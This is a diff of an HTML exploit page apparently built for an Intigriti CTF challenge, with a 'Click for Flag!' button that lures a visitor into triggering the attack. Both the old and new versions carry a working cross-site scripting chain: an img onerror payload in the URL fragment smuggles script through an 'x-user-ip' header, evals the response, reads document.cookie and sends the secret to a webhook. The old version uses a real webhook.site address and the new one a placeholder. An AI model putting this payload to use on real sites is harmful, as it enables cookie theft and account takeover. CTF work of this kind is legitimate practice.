@@ -1,75 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple CTF Exploit</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #f5f5f5;
-        }
-        .button {
-            padding: 20px 40px;
-            background-color: #4CAF50;
-            color: white;
-            font-size: 24px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-    </style>
+<title>Click to Win!</title>
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background-color: #f0f0f0;
+}
+#clickme {
+  padding: 20px 40px;
+  font-size: 24px;
+  cursor: pointer;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
+</style>
 </head>
 <body>
-    <button id="clickme" class="button">Click Me!</button>
+<button id="clickme">Click for Flag!</button>
 
-    <script>
-        window.onload = function() {
-            // Get the button
-            var button = document.getElementById('clickme');
-            
-            // When the button is clicked
-            button.onclick = function() {
-                // This injects a simple image request that will send the cookie to our webhook
-                var xssPayload = `
-                (function() {
-                    var c = document.cookie;
-                    var s = '';
-                    if (c.includes('secret=')) {
-                        s = c.split('secret=')[1].split(';')[0];
-                    }
-                    var d = '';
-                    try { d = atob(s); } catch(e) {}
-                    var i = new Image();
-                    i.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c=' + 
-                        encodeURIComponent(c) + 
-                        '&s=' + encodeURIComponent(s) + 
-                        '&d=' + encodeURIComponent(d) + 
-                        '&t=' + new Date().getTime();
-                    document.body.appendChild(i);
-                })()`;
-                
-                // Create a URL with an XSS payload in the fragment
-                // This will automatically be executed when the page loads
-                var url = 'https://challenge-0325.intigriti.io/note/exploit#' + 
-                    encodeURIComponent('<img src=x onerror="' + 
-                        'fetch(\'/api/track\', {' +
-                        'headers: {\'x-user-ip\': \'' + xssPayload.replace(/'/g, "\\'").replace(/\n/g, ' ') + '\'}' +
-                        '}).then(r => r.text()).then(t => eval(t))' +
-                    '">');
-                
-                // Redirect to the target URL
-                window.location.href = url;
-            };
-        };
-    </script>
+<script>
+document.getElementById('clickme').onclick = function() {
+  const payload = `
+    (function() {
+      const secret = document.cookie.split('secret=')[1]?.split(';')[0];
+      const flag = atob(secret || '').split(':')[1] || '';
+      new Image().src = 'https://YOUR-WEBHOOK.url/?' + encodeURIComponent(flag);
+    })()
+  `.replace(/\n/g, ' ');
+
+  const exploitUrl = 
+    'https://challenge-0325.intigriti.io/note/x#' +
+    encodeURIComponent(
+      `<img src=x onerror="
+        fetch('/api/track', {
+          headers: {'x-user-ip': '${payload.replace(/'/g, "\\'")}'}
+        }).then(r => r.text()).then(eval)
+      ">`
+    );
+  
+  location.href = exploitUrl;
+};
+</script>
 </body>
 </html>
